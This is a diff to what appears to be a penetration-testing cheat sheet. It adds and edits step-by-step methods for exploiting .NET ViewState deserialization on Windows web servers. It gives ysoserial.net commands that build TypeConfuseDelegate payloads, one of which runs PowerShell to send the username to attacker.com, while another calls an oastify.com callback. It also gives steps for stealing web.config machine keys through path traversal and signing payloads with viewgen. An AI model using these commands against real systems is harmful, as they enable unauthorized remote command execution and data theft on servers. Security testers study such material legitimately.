@@ -646,7 +646,7 @@ Example 1 - Context: .Net framework < 4,5 and EnableViewStateMac=true and ViewSt
 
 ➤ Step 2. Grab a '__VIEWSTATEGENERATOR' value (modifier e.g. '306A601A') from a web page of the target .NET Web application
 
-➤ Step 3. Generate a signed malicious OS command payload with the tool 'ysoserial.net' and the pre-shared validation key and the '__VIEWSTATEGENERATOR' value
+➤ Step 3. Generate a signed (OS command) payload with the tool 'ysoserial.net' and the pre-shared validation key and the '__VIEWSTATEGENERATOR' value
            - Tool: https://github.com/pwntester/ysoserial.net
            - C:\temp> .\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd.exe /c nslookup <snip>.oastify.com" --islegacy --isdebug --apppath="/auditaspx/"  --validationalg="SHA1" --validationkey="C50B3C89CB21F<snip>" --generator=306A601A
            OR
@@ -663,7 +663,18 @@ Example 1 - Context: .Net framework < 4,5 and EnableViewStateMac=true and ViewSt
              __VIEWSTATE=<signed-payload-generated-with-yoserial>&__VIEWSTATEGENERATOR=306A601A&__EVENTVALIDATION=<SNIP>&<SNIP>
 ```
 ```
-Example 2 - Context: .Net framework > 4,5 and EnableViewStateMac=true and ViewStateEncryptionMode=true and We have access to the 'web.config' file
+Example 2 - Context: Any .Net framework < 4,5 and EnableViewStateMac=False and ViewStateEncryptionMode=false
+
+➤ Step 1. Identify that both the ViewState MAC and encryption are disabled for a target .Net Web application using the Burp Web proxy
+
+➤ Step 2. Generate a malicious (OS command) payload with the tool 'ysoserial.net'
+           - Tool: https://github.com/pwntester/ysoserial.net
+           - C:\temp> ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
+
+➤ Step 3. Send an HTTP POST request with the generated "_ViewState=<payload-gnerated-with-yoserial>" to a Web page of the target Website to execute an arbitrary OS command on the underlying Windows server
+```
+```
+Example 3 - Context: .Net framework > 4,5 and EnableViewStateMac=true and ViewStateEncryptionMode=true and We have access to the 'web.config' file
 
 ➤ Step 1. Get unauthorized access to the 'web.config' file of a .Net Web application by exploiting for example a file path traversal vulnerability 
            - Note: the validation and decryption keys and algorithms can be found within the machineKey section of the configuration file 'web.config' (or machine.config)
@@ -674,12 +685,13 @@ Example 2 - Context: .Net framework > 4,5 and EnableViewStateMac=true and ViewSt
 
 ➤ Step 3. Grab a '__VIEWSTATEGENERATOR' value (modifier e.g. '306A601A') from a web page of the target .NET Web application
 
-➤ Step 4. Generate the signed/encrypted payload using the tool 'viewgen'
+➤ Step 4. Generate a signed/encrypted (OS command) payload using the tool 'viewgen'
            - Tool: https://github.com/0xACB/viewgen
-           - $ viewgen --webconfig web.config --modifier <MODIFIER-value> <signed-encrypted-payload-with-yoserial>
+           - $ viewgen --webconfig web.config --modifier <MODIFIER-value> <signed-encrypted-payload-generated-with-yoserial>
 
-➤ Step 5. Send an HTTP POST request with the generated "_ViewState=<signed-encrypted-payload-with-yoserial>" to a Web page of the target Website to execute arbitrary OS command on the underlying Windows server
+➤ Step 5. Send an HTTP POST request with the generated "_ViewState=<signed-encrypted-payload-generated-with-yoserial>" to a Web page of the target Website to execute arbitrary OS command on the underlying Windows server
 ```
+
 
 -----------------
 
